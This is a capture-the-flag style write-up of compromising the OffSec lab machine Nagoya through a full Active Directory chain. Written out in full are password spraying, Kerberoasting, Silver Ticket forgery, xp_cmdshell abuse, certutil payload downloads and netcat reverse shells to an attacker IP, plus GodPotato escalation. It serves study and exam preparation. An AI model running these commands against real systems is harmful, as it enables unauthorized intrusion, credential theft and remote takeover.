# How I Rooted OffSec Nagoya: Password Spraying, Kerberoasting, and a Silver Ticket to SYSTEM

> A full Active Directory attack chain — from username enumeration and password spraying to Kerberoasting, Silver Ticket forgery, and SYSTEM via SeImpersonatePrivilege.

---

## Machine Overview

![Machine Info](/nagoya/images/machine_info.png)

Nagoya is a Hard-rated Active Directory machine from OffSec Proving Grounds. It chains together a realistic corporate attack path — OSINT username enumeration, password spraying, binary reverse engineering, BloodHound-guided lateral movement, Kerberoasting, and a Silver Ticket attack to achieve command execution on a local MSSQL instance.

The machine punishes blindly running tools without understanding what they return. BloodHound shows you the path, but every step — forced password reset, Silver Ticket forgery, port forwarding through Ligolo — requires knowing exactly what you're doing and why.

## Summary of Findings

| # | Vulnerability | Severity | CVSS Score |
|---|---------------|----------|------------|
| 1 | Predictable Seasonal Password | Medium | 6.5 |
| 2 | GenericAll ACL Misconfiguration | High | 8.8 |
| 3 | Kerberoastable Service Account (Weak Password) | High | 8.8 |
| 4 | SeImpersonatePrivilege Abuse | High | 7.8 |

**Rationale for scores:**

- **6.5 Medium** — Domain account `fiona.clark` using a seasonal password (`Summer2023`) discoverable via low-effort spray. AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N.
- **8.8 High** — `svc_helpdesk` holds GenericAll over `christopher.lewis`, allowing forced password reset and lateral movement to WinRM access without knowing the target's credentials. AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H.
- **8.8 High** — `svc_mssql` is Kerberoastable with a weak password (`Service1`), enabling Silver Ticket forgery and sysadmin-level MSSQL access. AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H.
- **7.8 High** — `svc_mssql` holds SeImpersonatePrivilege, allowing SYSTEM escalation via GodPotato. AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H.

**Techniques covered:**
- Username enumeration from a corporate website
- Password spraying with seasonal passwords
- SMB enumeration and SYSVOL access
- .NET binary analysis with `strings -e l` (UTF-16 LE)
- BloodHound AD analysis
- GenericAll abuse — forced password reset via RPC
- WinRM access with `evil-winrm`
- Kerberoasting and hash cracking
- Port forwarding with Ligolo-ng
- Silver Ticket attack (`impacket-ticketer`)
- MSSQL `xp_cmdshell` for command execution
- SeImpersonatePrivilege abuse with GodPotato

If you are preparing for OSCP or OSEP, this machine is worth your time — it covers every major phase of a real AD engagement and forces you to understand Kerberos authentication deeply enough to forge a ticket yourself.

---

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV -oN nmap.txt 192.168.191.21
```

![Nmap Scan](/nagoya/images/nmap.png)

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Simple DNS Plus |
| 80 | HTTP | Microsoft IIS 10.0 |
| 88 | Kerberos | Windows Kerberos |
| 389/636/3268/3269 | LDAP | Active Directory |
| 445 | SMB | |
| 3389 | RDP | Product version 10.0.17763 (Server 2019) |
| 5985 | WinRM | |

Domain: `nagoya-industries.com` - this is a Domain Controller.

### Web Enumeration

Browsing port 80 reveals a corporate website with a `/team` page listing employee names.

![Team Page](/nagoya/images/team_page.png)

Extracted all names and generated username formats with username-anarchy:

```bash
username-anarchy -i names.txt > anarchyUsers.txt
```

Validated which accounts exist in the domain:

```bash
kerbrute userenum --dc 192.168.191.21 -d nagoya-industries.com anarchyUsers.txt
```

![Kerbrute Valids](/nagoya/images/kerbrute.png)

AS-REP roasting on valid users returned nothing - no accounts had pre-auth disabled.

---

## Initial Foothold

### Password Spraying

With no creds and anonymous LDAP/SMB access blocked, I first tried the classic `username:username` pattern - no hits.

```bash
nxc smb 192.168.191.21 -u valid_users.txt -p valid_users.txt --no-bruteforce --continue-on-success
```

Next I tried seasonal password spraying - a common corporate pattern where users pick `Season+Year` when forced to rotate passwords quarterly. I built a short targeted wordlist:

```bash
cat ~/wls/spray.txt
Summer2024
Summer2024!
Winter2024
Winter2024!
Spring2024
Spring2024!
Fall2024
Fall2024!
Summer2023
Winter2023
Password1
Password123
Welcome1
Welcome123
P@ssw0rd
```

```bash
nxc smb 192.168.191.21 -u valid_users.txt -p ~/wls/spray.txt --continue-on-success
```

![Password Spray Hit](/nagoya/images/spray_hit.png)

```
[+] nagoya-industries.com\fiona.clark:Summer2023
```

### SMB Enumeration - SYSVOL

With valid credentials the first thing to check is SMB shares - specifically `SYSVOL` and `NETLOGON`, which are readable by any authenticated domain user by default. These shares often contain Group Policy files, logon scripts, and sometimes even executables or credentials left by admins. On a real engagement this is one of the highest-value quick wins after getting any domain account.

```bash
nxc smb 192.168.191.21 -u fiona.clark -p Summer2023 --shares
```
![SYSVOL Browse](/nagoya/images/sysvol.png)

`SYSVOL` was readable. Connected and found a custom script directory:

```bash
smbclient //192.168.191.21/SYSVOL -U 'nagoya-industries.com\fiona.clark%Summer2023'
```

Inside `nagoya-industries.com/scripts/ResetPassword/` - a .NET executable: `ResetPassword.exe`.

### Binary Analysis - Extracting Hardcoded Credentials

Standard `strings` output was unreadable - .NET encodes strings as UTF-16 LE. Used the `-e l` flag:

```bash
strings -e l ResetPassword.exe
```

![Strings Output](/nagoya/images/strings_creds.png)

```
svc_helpdesk : U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
```

---

## Lateral Movement

### BloodHound Analysis

Collected AD data with BloodHound Python:

```bash
bloodhound-python -u svc_helpdesk -p U299iYRmikYTHDbPbxPoYYfa2j4x4cdg -d nagoya-industries.com -dc nagoya.nagoya-industries.com -c All
```

![BloodHound Graph](/nagoya/images/bloodhound.png)

BloodHound showed `svc_helpdesk` has **GenericAll** over `christopher.lewis`, who is a member of **Remote Management Users** (WinRM access).

### Forced Password Reset

GenericAll allows changing another user's password without knowing the current one:

```bash
net rpc password "CHRISTOPHER.LEWIS" "newP@ssword2022" -U "nagoya-industries.com/svc_helpdesk%U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S 192.168.191.21
```

Verified:

```bash
nxc smb 192.168.191.21 -u "CHRISTOPHER.LEWIS" -p "newP@ssword2022"
```

![CME Confirm](/nagoya/images/lewis_confirm.png)

### WinRM Shell

```bash
evil-winrm -i 192.168.191.21 -u CHRISTOPHER.LEWIS -p 'newP@ssword2022'
```

![WinRM Shell](/nagoya/images/winrm_shell.png)

---

## Privilege Escalation

### Kerberoasting

WinPEAS showed port 1433 (MSSQL) listening locally. To interact with it I needed SQL credentials. Kerberoasting revealed `svc_mssql` has a registered SPN:

```bash
impacket-GetUserSPNs -request -dc-ip 192.168.191.21 nagoya-industries.com/CHRISTOPHER.LEWIS -outputfile hash.txt
```

Cracked with John:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![Hash Cracked](/nagoya/images/hash_cracked.png)

```
svc_mssql : Service1
```

### Port Forwarding with Ligolo-ng

WinPEAS showed port 1433 (MSSQL) listening only on `127.0.0.1` - not accessible from Kali directly. I used Ligolo-ng to tunnel the internal network through my WinRM session.

**On Kali - start the proxy:**
```bash
sudo ip tuntap add user kaliman mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:11601
```

**On target via evil-winrm - upload and run the agent:**
```cmd
upload ~/tools/ligolo/agent.exe
.\agent.exe -connect 192.168.45.247:11601 -ignore-cert
```

**Back on Kali proxy - start the tunnel:**
```
session
start
```

The target's internal network is now reachable at `240.0.0.1`. MSSQL on `127.0.0.1:1433` of the target is accessible from Kali via `240.0.0.1:1433`.

Connected as svc_mssql - landed as `guest` with no permissions to enable `xp_cmdshell`. This requires sysadmin rights.

### Silver Ticket Attack

A Silver Ticket is a forged Kerberos service ticket. In normal Kerberos authentication, the KDC issues a ticket encrypted with the service account's secret key - the service then decrypts it to verify who you are. The key insight: **the KDC is not involved in this verification step**. The service trusts its own key entirely.

This means if you know a service account's NTLM hash (from Kerberoasting or cracking), you can forge a ticket yourself that claims to be any user - including Administrator - and the service will accept it without ever contacting the KDC.

**When can you use a Silver Ticket:**
- You have a service account's password or NTLM hash
- The service you're targeting runs under that account (MSSQL → `svc_mssql`, HTTP → `svc_web`, etc.)
- You know the Domain SID

Here, we Kerberoasted `svc_mssql`, cracked the password to `Service1`, and tried connecting directly - landed as `guest` with no sysadmin rights. The Silver Ticket lets us connect as Administrator instead, getting full sysadmin access to MSSQL.

Since we have `svc_mssql`'s password, we forge a ticket that impersonates Administrator directly to the MSSQL service - bypassing normal SQL authentication entirely.

**Step 1 - Generate NTLM hash from password:**
```bash
python3 -c "import hashlib; print(hashlib.new('md4', 'Service1'.encode('utf-16le')).hexdigest())"
# e3a0168bc21cfb88b95c954a5b18f57c
```

**Step 2 - Get Domain SID:**
```bash
impacket-lookupsid nagoya-industries.com/svc_mssql:Service1@192.168.191.21 | grep "Domain SID"
# S-1-5-21-1969309164-1513403977-1686805993
```

**Step 3 - Forge the ticket:**
```bash
impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c \
  -domain-sid S-1-5-21-1969309164-1513403977-1686805993 \
  -domain nagoya-industries.com \
  -spn MSSQLSvc/nagoya.nagoya-industries.com:1433 \
  -user-id 500 Administrator
```

**Step 4 - Update /etc/hosts to point hostname to Ligolo IP:**

This is a critical step. Kerberos authentication requires connecting by hostname, not IP - but the MSSQL connection needs to go through the Ligolo tunnel at `240.0.0.1`. Setting the hostname to the real DC IP (`192.168.191.21`) causes a timeout because port 1433 is not open externally. The hostname must resolve to `240.0.0.1` so the TCP connection routes through Ligolo.

```bash
sudo vi /etc/hosts
# add:
240.0.0.1 nagoya.nagoya-industries.com nagoya
```

**Step 5 - Connect with the forged ticket:**
```bash
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k nagoya.nagoya-industries.com
```

Now connected as `dbo` (sysadmin). Enabled `xp_cmdshell`:

```sql
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

Transferred netcat and got a shell:

```sql
EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.247/nc64.exe c:/windows/temp/nc64.exe";
EXEC xp_cmdshell "c:/windows/temp/nc64.exe -e cmd.exe 192.168.45.247 1337";
```

![Silver Ticket Shell](/nagoya/images/silver_ticket.png)

### GodPotato - SYSTEM

`svc_mssql` has `SeImpersonatePrivilege`. The first tool I tried was PrintSpoofer - it's always worth testing first because it almost never crashes the machine and is very stable:

```cmd
.\PrintSpoofer64.exe -i -c './nc64.exe cmd.exe 192.168.45.247 3000'
```

![PrintSpoofer Failed](/nagoya/images/printspoofer_fail.png)

PrintSpoofer failed - this happens sometimes depending on the OS configuration. Moved on to GodPotato.

Server 2019 build 17763, so GodPotato is the right choice. Checked the highest available .NET version - always pick the highest one in the list:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

![NET Version Check](/nagoya/images/dotnet_version.png)

4.x was the highest present, so used `GodPotato-NET4.exe`:

```cmd
certutil -urlcache -f http://192.168.45.247/GodPotato-NET4.exe c:/users/svc_mssql/desktop/GodPotato-NET4.exe
.\GodPotato-NET4.exe -cmd "cmd /c nc64.exe 192.168.45.247 3000 -e cmd.exe"
```

![SYSTEM Shell](/nagoya/images/system_shell.png)

```
nt authority\system
```

---

## What I Learned

**Password spraying seasonal patterns works in corporate AD.** When anonymous enumeration is blocked and AS-REP roasting fails, seasonal passwords (`Summer2023`, `Winter2024`) are a high-value spray target. Companies that enforce quarterly rotations push users into predictable patterns.

**UTF-16 LE strings require `-e l`.** Plain `strings` won't reveal .NET string literals. Always use `strings -e l` on .NET binaries. dnSpy gives full decompilation if you need to go deeper.

**Silver Ticket logic bypasses the KDC entirely.** When you own a service account's hash and normal SQL auth gives you guest-level access, forge a Silver Ticket. The KDC is never contacted — the ticket is presented directly to the service, which trusts its own secret key. This is why service account password rotation matters.

**Ligolo routing and /etc/hosts must match.** Kerberos ticket authentication works by hostname, not IP. When routing through Ligolo, `/etc/hosts` must map the hostname to the Ligolo IP (`240.0.0.1`), not the real DC IP, so the TCP connection actually reaches the service through the tunnel.
